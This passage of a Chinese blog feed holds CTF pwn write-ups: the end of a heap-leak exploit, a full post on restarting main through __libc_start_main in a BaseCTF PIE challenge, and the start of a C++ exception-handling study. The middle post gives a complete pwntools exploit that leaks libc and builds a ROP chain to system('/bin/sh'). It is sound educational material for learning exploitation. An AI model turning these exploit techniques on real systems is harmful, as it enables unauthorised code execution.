class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">dj(<span class="string">b&quot;nanchang&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露完堆地址之后的堆布局长这样（不考虑沙盒开的那堆tcachebin chunk）</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a470</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x520</span> (with flag bits: <span class="number">0x521</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a990</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4aec0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Top</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4b3f0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x1ec10</span> (with flag bits: <span class="number">0x1ec11</span>)</span><br></pre></td></tr></table></figure><p>由于show的时候需要查城市名字，所以能想到的泄露libc的方法只有从unsortedbin chunk切割了</p><p>TO BE CONTINUED…</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的ret2libc_start_main分析及利用</title>
      <link href="/2024/ret2libc-start-main/"/>
      <url>/2024/ret2libc-start-main/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><p>PIE的概念</p></li><li><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1">有关__libc_start_main的文章</a></p></li></ol><p>不过其实就算没看懂这篇文章问题也不大，只要是题目做多了的话都能知道一点就是，正常gcc编译出来的elf程序都会经历一个<code>_start</code>和<code>__libc_start_main</code>的过程。</p><p>这个阶段在程序里体现为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000010A0                 public _start</span><br><span class="line">.text:00000000000010A0 _start          proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000010A0 ; __unwind &#123;</span><br><span class="line">.text:00000000000010A0                 endbr64</span><br><span class="line">.text:00000000000010A4                 xor     ebp, ebp</span><br><span class="line">.text:00000000000010A6                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000000010A9                 pop     rsi             ; argc</span><br><span class="line">.text:00000000000010AA                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000000010AD                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000010B1                 push    rax</span><br><span class="line">.text:00000000000010B2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000000010B3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000000010B6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000000010B8                 lea     rdi, main       ; main</span><br><span class="line">.text:00000000000010BF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000010C5                 hlt</span><br><span class="line">.text:00000000000010C5 ; &#125; // starts at 10A0</span><br><span class="line">.text:00000000000010C5 _start          endp</span><br></pre></td></tr></table></figure><p>这段部分如果翻源码可以发现其实是直接用汇编写的。我们只需要关注一个点，<strong>执行__libc_start_main的时候rdi寄存器里存的是main的地址</strong>。</p><p>紧接着我们来看看<code>__libc_start_main</code>，但是这个程序很长，我们只关注部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029E33 loc_29E33:                              ; CODE XREF: __libc_start_main+124↓j</span><br><span class="line">.text:0000000000029E33                 mov     rdx, r12</span><br><span class="line">.text:0000000000029E36                 mov     esi, ebp</span><br><span class="line">.text:0000000000029E38                 mov     rdi, r13</span><br><span class="line">.text:0000000000029E3B                 call    sub_29D10</span><br></pre></td></tr></table></figure><p>call了一个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)</span><br><span class="line">.text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 var_90          = qword ptr -90h</span><br><span class="line">.text:0000000000029D10 var_84          = dword ptr -84h</span><br><span class="line">.text:0000000000029D10 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000029D10 var_78          = byte ptr -78h</span><br><span class="line">.text:0000000000029D10 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000029D10 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000029D10 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 ; __unwind &#123;</span><br><span class="line">.text:0000000000029D10                 push    rax</span><br><span class="line">.text:0000000000029D11                 pop     rax</span><br><span class="line">.text:0000000000029D12                 sub     rsp, 98h</span><br><span class="line">.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi  &lt;-- 1</span><br><span class="line">.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env</span><br><span class="line">.text:0000000000029D23                 mov     [rsp+98h+var_84], esi</span><br><span class="line">.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx</span><br><span class="line">.text:0000000000029D2C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000029D35                 mov     [rsp+98h+var_10], rax</span><br><span class="line">.text:0000000000029D3D                 xor     eax, eax</span><br><span class="line">.text:0000000000029D3F                 call    _setjmp</span><br><span class="line">.text:0000000000029D44                 endbr64</span><br><span class="line">.text:0000000000029D48                 test    eax, eax</span><br><span class="line">.text:0000000000029D4A                 jnz     short loc_29D97</span><br><span class="line">.text:0000000000029D4C                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000029D55                 mov     [rsp+98h+var_30], rax</span><br><span class="line">.text:0000000000029D5A                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000029D63                 mov     [rsp+98h+var_28], rax</span><br><span class="line">.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]</span><br><span class="line">.text:0000000000029D6D                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000029D76                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]</span><br><span class="line">.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]</span><br><span class="line">.text:0000000000029D86                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000029D89                 mov     rax, [rsp+98h+var_90]  &lt;-- 2</span><br><span class="line">.text:0000000000029D8E                 call    rax  &lt;-- 3</span><br><span class="line">.text:0000000000029D90                 mov     edi, eax</span><br><span class="line">.text:0000000000029D92</span><br><span class="line">.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j</span><br><span class="line">.text:0000000000029D92                 call    exit</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其实这个函数就是pwndbg里显示的<code>__libc_start_call_main</code>。关注标注出来的几行可以发现rdi最后是被传入rax后被call了，才正式进入了main函数开始执行程序流程。换个角度来看，main函数的返回地址就是<code>mov edi,eax</code>那一行，紧接着就exit了。</p><h3 id="BaseCTF-week3-PIE题目分析"><a href="#BaseCTF-week3-PIE题目分析" class="headerlink" title="BaseCTF week3  PIE题目分析"></a>BaseCTF week3  PIE题目分析</h3><p>题目其实非常简单，也很简短。开了PIE保护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you said %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个溢出，一次打印。问题在于这题既没有后门，也没有说把溢出放在一个子函数里，而是放在了main函数，那就导致了其返回地址是一个libc地址，没法直接部分写返回main。因为只有一次机会，没法做到同时泄露地址又写进去一个地址，所以也只有可能用部分写了。所以考虑用<code>ret2__libc_start_main</code>来重启main函数。</p><p>一开始调试看到返回地址是<code>__libc_start_call_main+128</code>（0x29D90），所以就想着我要不直接把那个地址减去108，然后填回去（0x29D10），刚好只有最后一个字节改变了。但是发现打不通，最后会卡在movaps。然后尝试绕过第一个push指令，还是不行，rax是非法地址。</p><p>然后尝试填<code>__libc_start_main</code>的首地址（0x29DC0），依然是上面两个问题。所以我就打开libc文件来看汇编了，发现<code>__libc_start_call_main</code>这个函数前半部分基本上都是在进行寄存器状态的保存。后面尝试了几次发现最后一个字节从1e到89都是可以用来打通的。所以开始找原因，于是就有了上面前置知识那样的分析。</p><p>其实最大的问题也就发生在那个rdi身上，如果他存着main的函数地址，那么main是可以被正常启动的。但是很显然程序不会无缘无故把main函数存到rdi里。所以如果跳过保存rdi到栈上那一步就能够正常运行了。</p><p>能正常运行意味着，栈上对应位置确实存着main的函数地址，这是怎么回事呢？我们动调看看。</p><p><img src="https://c-lby.top/images/ret2libc_start_main/%E6%A0%88%E8%BF%98%E5%8E%9F.png" alt="栈还原"></p><p>程序从rsp+8处取main地址，栈刚好满足。这是因为main函数执行之前就存在过__libc_start_main函数的栈帧，而main函数正常返回也会回到这个栈帧里来。换句话说，只要我在之前的操作中没有破坏到这个地方，那么函数就能正常从栈中取到main地址，从而实现重启main函数。</p><p>那这道题下面就很简单，因为可以实现重启main，那我们就可以利用第一次printf覆盖\x00带出libc地址，然后获取libc基址，第二次回到main函数的时候再ROP执行binsh即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 35787)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># e = ELF(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x1e&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x123e)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d1e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ret2__libc_start_main </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++异常处理机制及其利用研究</title>
      <link href="/2024/cpp-exception/"/>
      <url>/2024/cpp-exception/</url>
      
        <content type="html"><![CDATA[<h3 id="自己的理解与尝试"><a href="#自己的理解与尝试" class="headerlink" title="自己的理解与尝试"></a>自己的理解与尝试</h3><h4 id="编写demo看执行结果"><a href="#编写demo看执行结果" class="headerlink" title="编写demo看执行结果"></a>编写demo看执行结果</h4><p><a href="https://www.cnblogs.com/catch/p/3604516.html">参考资料</a>然后根据资料里的demo自己改了一下看看实际try…catch是怎么运行的</p><h5 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">int</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 2</span><br><span class="line">func2 exit</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到<code>func3</code>抛出异常之后，throw后面的代码不再执行。因为func3本身没有catch，所以会从他的调用者去找catch。这里catch理解成异常处理函数。catch2执行完之后会继续把func2、func1和main执行完。</p><h5 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h5><p>现在我们试试吧catch2也去掉：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 1</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到由于func2也找不到catch，所以会沿着调用链继续向上找，找到了func1处的catch。伴随着func2中的catch的消失而发生的另一个变化是，func2也没有执行完，但是会从func1的catch后继续执行。</p><h5 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h5><p>接下来试试在程序中不定义catch看看会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">test_func2</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">terminate called after throwing an instance of &#x27;int&#x27;</span><br><span 